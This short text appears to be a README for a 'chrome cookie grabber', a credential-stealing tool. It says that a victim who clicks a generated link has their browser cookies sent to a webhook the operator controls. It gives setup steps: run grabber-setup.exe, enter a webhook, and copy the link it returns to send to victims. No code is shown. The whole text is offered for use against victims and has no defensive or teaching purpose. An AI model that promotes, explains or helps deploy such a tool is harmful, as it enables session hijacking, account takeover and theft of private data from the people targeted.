This is a simple chrome cookie grabber. When your victim clicks on a link their cookies are sent to a webhook.

How to use 
1. Run grabber-setup.exe 
2. Put in the webhook from the channel you want to receive cookies from.

Now it will return a link that you can copy paste and the victims info will be sent to that webhook.
